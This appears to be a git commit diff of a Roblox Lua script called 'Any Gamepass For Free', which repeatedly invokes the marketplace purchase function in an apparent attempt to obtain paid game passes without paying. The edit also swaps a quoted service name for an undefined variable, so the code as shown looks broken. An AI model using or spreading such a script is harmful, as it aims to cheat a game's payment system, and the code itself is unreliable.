126ac3ae34b945d17a87ef94ec751d5251747c99
kdidjfidsji <105159895+kdidjfidsji@users.noreply.github.com>
2022-05-08 21:53:17 +0800

    Update Any Gamepass For Free.lua

--- Any Gamepass For Free.lua
+++ Any Gamepass For Free.lua
@@ -1,7 +1,7 @@
-gamePassId = 6028667
-market = game:GetService("MarketplaceService")
+gamePassId = 26483576
+market = game:GetService(Store)
 http = game:GetService("HttpService")
 info = market:GetProductInfo(gamePassId, Enum.InfoType.GamePass)
 game:GetService("RunService").Stepped:connect(function()
-market:PerformPurchase(Enum.InfoType.Asset, info["ProductId"], info["PriceInRobux"], http:GenerateGUID(false))
+market:PerformPurchase(Enum.InfoType.Asset, info["ProductId"], info["PriceInRobux"], http:GenerateGUID(true))
 end)
